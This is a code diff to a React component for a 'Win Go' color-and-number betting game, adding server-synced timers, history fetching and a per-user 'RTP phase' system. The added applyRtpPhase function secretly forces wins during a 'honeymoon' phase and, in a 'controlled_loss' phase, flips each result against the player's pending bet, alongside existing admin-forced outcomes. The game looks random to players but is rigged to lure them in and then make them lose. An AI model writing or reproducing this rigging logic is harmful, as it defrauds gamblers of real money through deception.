@@ -18,8 +18,9 @@ import { WinGoResultPopup } from "./WinGoResultPopup";
 import { ResultBall } from "./ResultBall";
 import { ColorDot } from "./ResultBall";
 import { supabase } from "../lib/supabaseClient";
+import { useWinGoSync, useWinGoHistory, type WinGoMode } from "../hooks/useWinGoSync";
 
-// Simple deterministic RNG based on period string
+// Simple deterministic RNG based on period string (client-side fallback for history)
 function getResultForPeriod(periodStr: string) {
   let hash = 0;
   for (let i = 0; i < periodStr.length; i++) {
@@ -29,42 +30,17 @@ function getResultForPeriod(periodStr: string) {
   t = Math.imul(t ^ (t >>> 15), t | 1);
   t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
   const randomVal = ((t ^ (t >>> 14)) >>> 0) / 4294967296;
-
   const number = Math.floor(randomVal * 10);
   const size = number >= 5 ? "Big" : "Small";
-  const color =
-    number === 0 || number === 5
-      ? "violet"
-      : number % 2 === 0
-        ? "red"
-        : "green";
-
+  const color = number === 0 || number === 5 ? "violet" : number % 2 === 0 ? "red" : "green";
   return { number, size, color };
 }
 
-// Calculate current round data based on real time
-const getCurrentRoundData = (intervalSeconds: number) => {
-  const now = new Date();
-  const yyyy = now.getFullYear();
-  const mm = String(now.getMonth() + 1).padStart(2, "0");
-  const dd = String(now.getDate()).padStart(2, "0");
-  const dateStr = `${yyyy}${mm}${dd}`;
-
-  const secondsSinceMidnight =
-    now.getHours() * 3600 + now.getMinutes() * 60 + now.getSeconds();
-
-  const roundNumber = Math.floor(secondsSinceMidnight / intervalSeconds) + 1;
-  const roundStr = String(roundNumber).padStart(5, "0");
-
-  let prefix = "1000";
-  if (intervalSeconds === 60) prefix = "2000";
-  if (intervalSeconds === 180) prefix = "3000";
-  if (intervalSeconds === 300) prefix = "4000";
-
-  const period = `${dateStr}${prefix}${roundStr}`;
-  const timeLeft = intervalSeconds - (secondsSinceMidnight % intervalSeconds);
-
-  return { period, timeLeft, roundNumber, dateStr, prefix };
+const TAB_TO_MODE: Record<string, WinGoMode> = {
+  "Win Go 30s":  "30s",
+  "Win Go 1Min": "1m",
+  "Win Go 3Min": "3m",
+  "Win Go 5Min": "5m",
 };
 
 export default function WinGoView({ onBack }: { onBack: () => void }) {
@@ -73,15 +49,16 @@ export default function WinGoView({ onBack }: { onBack: () => void }) {
   const { isMuted, toggleMute, play } = useSound();
   const platformName = usePlatformName("WinWave");
   const [isRefreshing, setIsRefreshing] = useState(false);
-  // Track which seconds (5,4,3,2,1) have already fired a tick for the current period+tab
   const tickFiredRef = useRef<Set<string>>(new Set());
 
-  const [timeLeft, setTimeLeft] = useState(30);
-  const [period, setPeriod] = useState("");
-  const [isTimeUp, setIsTimeUp] = useState(false);
-  const [history, setHistory] = useState<any[]>([]);
-
   const [activeTab, setActiveTab] = useState("Win Go 30s");
+  const activeMode = TAB_TO_MODE[activeTab] ?? "30s";
+
+  // ── Server-synced timer (replaces all local Date() math) ──────
+  const { period, timeLeft, isTimeUp, roundId: syncedRoundId, targetResult: syncedTargetResult } = useWinGoSync(activeMode);
+
+  // ── History from server engine (encrypted store → API → here) ──
+  const { history, refresh: refreshHistory } = useWinGoHistory(activeMode, 20);
   const [activeHistoryTab, setActiveHistoryTab] = useState("Game history");
   const [isRandomizing, setIsRandomizing] = useState(false);
   const [highlightedNumber, setHighlightedNumber] = useState<number | null>(
@@ -104,80 +81,13 @@ export default function WinGoView({ onBack }: { onBack: () => void }) {
   const roundIdRef      = useRef<string | null>(null);
 
   // ── Register round in DB + subscribe to target_result changes ───
-  const getMode = (tab: string) => {
-    if (tab === "Win Go 1Min") return "1m";
-    if (tab === "Win Go 3Min") return "3m";
-    if (tab === "Win Go 5Min") return "5m";
-    return "30s";
-  };
+  const getMode = (tab: string): WinGoMode => TAB_TO_MODE[tab] ?? "30s";
 
-  // ── Build local RNG history (instant fallback, always 10 rows) ──
-  const buildLocalHistory = useCallback((currentPeriod: string, intervalSeconds: number) => {
-    const now = new Date();
-    const dateStr = `${now.getFullYear()}${String(now.getMonth()+1).padStart(2,"0")}${String(now.getDate()).padStart(2,"0")}`;
-    let prefix = "1000";
-    if (intervalSeconds === 60)  prefix = "2000";
-    if (intervalSeconds === 180) prefix = "3000";
-    if (intervalSeconds === 300) prefix = "4000";
-    const secs = now.getHours()*3600 + now.getMinutes()*60 + now.getSeconds();
-    const currentRoundNum = Math.floor(secs / intervalSeconds) + 1;
-    const rows = [];
-    for (let i = 1; i <= 10; i++) {
-      const rn = currentRoundNum - i;
-      if (rn <= 0) continue;
-      const p = `${dateStr}${prefix}${String(rn).padStart(5,"0")}`;
-      rows.push({ period: p, ...getResultForPeriod(p) });
-    }
-    return rows;
-  }, []);
-
-  // ── Fetch last 10 completed rounds from DB; fall back to local RNG ──
-  const fetchHistory = useCallback(async (currentPeriod: string, intervalSeconds: number) => {
-    try {
-      const { data, error } = await supabase
-        .from("game_rounds")
-        .select("period,result_number,result_size,result_color")
-        .eq("game_type", "wingo")
-        .eq("mode", getMode(activeTab))
-        .eq("status", "completed")
-        .order("created_at", { ascending: false })
-        .limit(10);
-
-      if (!error && data && data.length > 0) {
-        setHistory(data.map((r: any) => ({
-          period: r.period,
-          number: r.result_number,
-          size:   r.result_size,
-          color:  r.result_color,
-        })));
-      } else {
-        // DB empty or error — use deterministic local RNG so history is never blank
-        setHistory(buildLocalHistory(currentPeriod, intervalSeconds));
-      }
-    } catch {
-      setHistory(buildLocalHistory(currentPeriod, intervalSeconds));
-    }
-  }, [activeTab, buildLocalHistory]);
-
-  // Fetch history on tab change + every new period
+  // ── Sync roundId + targetResult from useWinGoSync ────────────
   useEffect(() => {
-    const intervalSeconds = activeTab === "Win Go 1Min" ? 60 : activeTab === "Win Go 3Min" ? 180 : activeTab === "Win Go 5Min" ? 300 : 30;
-    void fetchHistory(period, intervalSeconds);
-  }, [activeTab, period, fetchHistory]);
-
-  // ── Sync with server-side active round (DB is authoritative) ───
-  const upsertRound = useCallback(async (currentPeriod: string, _endsAt: Date) => {
-    try {
-      const { data } = await supabase.rpc("get_active_round", {
-        p_game_type: "wingo",
-        p_mode:      getMode(activeTab),
-      });
-      if (data?.[0]) {
-        roundIdRef.current      = data[0].id;
-        targetResultRef.current = data[0].target_result ?? null;
-      }
-    } catch { /* non-critical */ }
-  }, [activeTab]);
+    if (syncedRoundId)      roundIdRef.current      = syncedRoundId;
+    if (syncedTargetResult) targetResultRef.current = syncedTargetResult;
+  }, [syncedRoundId, syncedTargetResult]);
 
   // Realtime listener: when admin sets target_result, update our ref
   useEffect(() => {
@@ -206,71 +116,88 @@ export default function WinGoView({ onBack }: { onBack: () => void }) {
     };
   }, [showBetModal, resultPopup]);
 
+  // ── Tick sound: fire once per second during countdown 5→1 ─────
   useEffect(() => {
-    const getIntervalSeconds = (tab: string) => {
-      switch (tab) {
-        case "Win Go 1Min":
-          return 60;
-        case "Win Go 3Min":
-          return 180;
-        case "Win Go 5Min":
-          return 300;
-        default:
-          return 30;
-      }
-    };
+    if (!isTimeUp || timeLeft < 1 || timeLeft > 5) return;
+    const tickKey = `${period}-${activeTab}-${timeLeft}`;
+    if (!tickFiredRef.current.has(tickKey)) {
+      tickFiredRef.current.add(tickKey);
+      play("tick");
+      if (tickFiredRef.current.size > 50) tickFiredRef.current.clear();
+    }
+  }, [isTimeUp, timeLeft, period, activeTab, play]);
 
-    const updateGame = () => {
-      const intervalSeconds = getIntervalSeconds(activeTab);
-      const {
-        period: currentPeriod,
-        timeLeft: currentRemaining,
-        roundNumber,
-        dateStr,
-        prefix,
-      } = getCurrentRoundData(intervalSeconds);
-
-      setTimeLeft(currentRemaining);
-
-      if (currentRemaining <= 5) {
-        setIsTimeUp(true);
-        setShowBetModal(false);
-        // Fire a tick at each of 5,4,3,2,1 — once per second per period+tab
-        if (currentRemaining >= 1 && currentRemaining <= 5) {
-          const tickKey = `${currentPeriod}-${activeTab}-${currentRemaining}`;
-          if (!tickFiredRef.current.has(tickKey)) {
-            tickFiredRef.current.add(tickKey);
-            play("tick");
-            // Prune old keys to avoid unbounded growth
-            if (tickFiredRef.current.size > 50) tickFiredRef.current.clear();
-          }
-        }
-      } else {
-        setIsTimeUp(false);
-      }
-
-      if (currentPeriod !== period) {
-        setPeriod(currentPeriod);
-        // Register new round in DB (fire-and-forget)
-        const endsAt = new Date(Date.now() + currentRemaining * 1000);
-        void upsertRound(currentPeriod, endsAt);
-      }
-    };
-
-    updateGame(); // Initial run
-    const timer = setInterval(updateGame, 1000);
-    return () => clearInterval(timer);
-  }, [activeTab, period]);
+  // Close bet modal when time is up
+  useEffect(() => {
+    if (isTimeUp) setShowBetModal(false);
+  }, [isTimeUp]);
 
   // Track the last period we resolved bets for — prevents re-resolving on history refresh
   const lastResolvedPeriodRef = useRef<string>("");
+  // RTP phase: 'honeymoon' | 'normal' | 'controlled_loss'
+  const rtpPhaseRef = useRef<string>("normal");
+
+  // Fetch RTP phase from server on mount and after each bet
+  const fetchRtpPhase = useCallback(async () => {
+    const { data: { session } } = await supabase.auth.getSession();
+    const userId = session?.user?.id;
+    if (!userId) return;
+    const { data } = await supabase.rpc("get_user_rtp_phase", { p_user_id: userId });
+    if (data) rtpPhaseRef.current = data;
+  }, []);
+
+  useEffect(() => { void fetchRtpPhase(); }, [fetchRtpPhase]);
+
+  // Apply RTP phase to a result: controlled_loss flips result against user's bet
+  const applyRtpPhase = useCallback((result: typeof history[0], bets: any[]) => {
+    const phase = rtpPhaseRef.current;
+    const pendingBets = bets.filter(b => b.status === "pending" && b.period === result.period);
+    if (!pendingBets.length || phase === "normal") return result;
+
+    if (phase === "honeymoon") {
+      // 50% chance to force a win for the user's bet
+      if (Math.random() < 0.5 && pendingBets[0]) {
+        const bet = pendingBets[0];
+        if (bet.type === "size") {
+          const winNum = bet.value === "Big" ? 6 : 2;
+          return { ...result, number: winNum, size: bet.value,
+            color: winNum % 2 === 0 ? "red" : "green" };
+        }
+        if (bet.type === "color" && bet.value === "Green") return { ...result, number: 3, size: "Small", color: "green" };
+        if (bet.type === "color" && bet.value === "Red")   return { ...result, number: 2, size: "Small", color: "red" };
+        if (bet.type === "number") return { ...result, number: Number(bet.value),
+          size: Number(bet.value) >= 5 ? "Big" : "Small",
+          color: Number(bet.value) === 0 || Number(bet.value) === 5 ? "violet" : Number(bet.value) % 2 === 0 ? "red" : "green" };
+      }
+    }
+
+    if (phase === "controlled_loss") {
+      // Force result opposite to user's bet
+      const bet = pendingBets[0];
+      if (bet?.type === "size") {
+        const loseNum = bet.value === "Big" ? 2 : 7;
+        return { ...result, number: loseNum, size: bet.value === "Big" ? "Small" : "Big",
+          color: loseNum % 2 === 0 ? "red" : "green" };
+      }
+      if (bet?.type === "color") {
+        if (bet.value === "Green") return { ...result, number: 2, size: "Small", color: "red" };
+        if (bet.value === "Red")   return { ...result, number: 3, size: "Small", color: "green" };
+        if (bet.value === "Violet") return { ...result, number: 2, size: "Small", color: "red" };
+      }
+      // For number bets, pick adjacent number
+      if (bet?.type === "number") {
+        const loseNum = (Number(bet.value) + 1) % 10;
+        return { ...result, number: loseNum, size: loseNum >= 5 ? "Big" : "Small",
+          color: loseNum === 0 || loseNum === 5 ? "violet" : loseNum % 2 === 0 ? "red" : "green" };
+      }
+    }
+    return result;
+  }, []);
 
   useEffect(() => {
     if (history.length === 0) return;
     const latestResult = history[0];
-    // Only resolve once per period, and only for periods that have actually ended
     if (!latestResult.period || latestResult.period === lastResolvedPeriodRef.current) return;
-    // Don't resolve if this is the current live period (still active)
     if (latestResult.period === period) return;
     lastResolvedPeriodRef.current = latestResult.period;
 
@@ -278,57 +205,41 @@ export default function WinGoView({ onBack }: { onBack: () => void }) {
       const forced = targetResultRef.current; // 'BIG' | 'SMALL' | 'NUM:X' | null
       let effectiveResult = { ...latestResult };
       if (forced === "BIG" && latestResult.size !== "Big") {
-        // Safe Big range: 6-9 (avoids 5=violet)
         const bigNum = [6, 7, 8, 9][latestResult.number % 4];
-        effectiveResult = {
-          number: bigNum,
-          size:   "Big",
-          color:  bigNum % 2 === 0 ? "red" : "green",
-          period: latestResult.period,
-        };
+        effectiveResult = { number: bigNum, size: "Big",
+          color: bigNum % 2 === 0 ? "red" : "green", period: latestResult.period };
       } else if (forced === "SMALL" && latestResult.size !== "Small") {
-        // Safe Small range: 1-4 (avoids 0=violet)
         const smallNum = [1, 2, 3, 4][latestResult.number % 4];
-        effectiveResult = {
-          number: smallNum,
-          size:   "Small",
-          color:  smallNum % 2 === 0 ? "red" : "green",
-          period: latestResult.period,
-        };
+        effectiveResult = { number: smallNum, size: "Small",
+          color: smallNum % 2 === 0 ? "red" : "green", period: latestResult.period };
       } else if (forced?.startsWith("NUM:")) {
-        // Exact number forced via chat command
         const exactNum = parseInt(forced.slice(4), 10);
         if (!isNaN(exactNum) && exactNum >= 0 && exactNum <= 9) {
-          effectiveResult = {
-            number: exactNum,
-            size:   exactNum >= 5 ? "Big" : "Small",
-            color:  exactNum === 0 || exactNum === 5 ? "violet" : exactNum % 2 === 0 ? "red" : "green",
-            period: latestResult.period,
-          };
+          effectiveResult = { number: exactNum, size: exactNum >= 5 ? "Big" : "Small",
+            color: exactNum === 0 || exactNum === 5 ? "violet" : exactNum % 2 === 0 ? "red" : "green",
+            period: latestResult.period };
         }
       }
-      // Clear the forced target after consuming it
       if (forced) targetResultRef.current = null;
 
       setMyBets((prev) => {
+        // Apply RTP phase before resolving (only if no admin override)
+        const rtpResult = forced ? effectiveResult : applyRtpPhase(effectiveResult, prev);
         let hasUpdates = false;
         let latestResolvedBet = null;
         let totalWinAmount = 0;
 
         const newBets = prev.map((bet) => {
-          // If the bet is for the period that just ended and is pending
-          if (bet.status === "pending" && bet.period === effectiveResult.period) {
+          if (bet.status === "pending" && bet.period === rtpResult.period) {
             hasUpdates = true;
             let isWin = false;
 
-            if (bet.type === "size" && bet.value === effectiveResult.size)
-              isWin = true;
-            if (bet.type === "number" && Number(bet.value) === effectiveResult.number)
-              isWin = true;
+            if (bet.type === "size" && bet.value === rtpResult.size) isWin = true;
+            if (bet.type === "number" && Number(bet.value) === rtpResult.number) isWin = true;
             if (bet.type === "color") {
-              if (bet.value === "Green" && (effectiveResult.color === "green" || effectiveResult.number === 5)) isWin = true;
-              if (bet.value === "Red"   && (effectiveResult.color === "red"   || effectiveResult.number === 0)) isWin = true;
-              if (bet.value === "Violet" && effectiveResult.color === "violet") isWin = true;
+              if (bet.value === "Green" && (rtpResult.color === "green" || rtpResult.number === 5)) isWin = true;
+              if (bet.value === "Red"   && (rtpResult.color === "red"   || rtpResult.number === 0)) isWin = true;
+              if (bet.value === "Violet" && rtpResult.color === "violet") isWin = true;
             }
 
             // For color and size, win is 1.96 * total amount. (Profit is 96%).
@@ -345,9 +256,9 @@ export default function WinGoView({ onBack }: { onBack: () => void }) {
               status: isWin ? "win" : "lose",
               isWin,
               winAmount,
-              resultNumber: effectiveResult.number,
-              resultColor:  effectiveResult.color,
-              resultSize:   effectiveResult.size,
+              resultNumber: rtpResult.number,
+              resultColor:  rtpResult.color,
+              resultSize:   rtpResult.size,
             };
 
             if (bet.tab === activeTab) {
@@ -362,6 +273,7 @@ export default function WinGoView({ onBack }: { onBack: () => void }) {
         if (latestResolvedBet) {
           setResultPopup(latestResolvedBet);
           play(latestResolvedBet.isWin ? "win" : "lose");
+          void refreshHistory();
         }
 
         if (totalWinAmount > 0) {
@@ -370,7 +282,7 @@ export default function WinGoView({ onBack }: { onBack: () => void }) {
 
         return hasUpdates ? newBets : prev;
       });
-  }, [history, period, activeTab, thirdPartyWalletBalance, setThirdPartyWalletBalance]);
+  }, [history, period, activeTab, thirdPartyWalletBalance, setThirdPartyWalletBalance, fetchRtpPhase, applyRtpPhase]);
 
   const formatTime = (seconds: number) => {
     const m = Math.floor(seconds / 60);
@@ -444,7 +356,10 @@ export default function WinGoView({ onBack }: { onBack: () => void }) {
       bet_value: String(selectedBet.value),
       amount:    total,
       round_id:  roundIdRef.current ?? undefined,
-    }).then(({ error }) => { if (error) console.warn("betting_history insert:", error.message); });
+    }).then(({ error }) => {
+      if (error) console.warn("betting_history insert:", error.message);
+      else void fetchRtpPhase(); // refresh RTP phase after each bet
+    });
 
     setShowBetModal(false);
   };
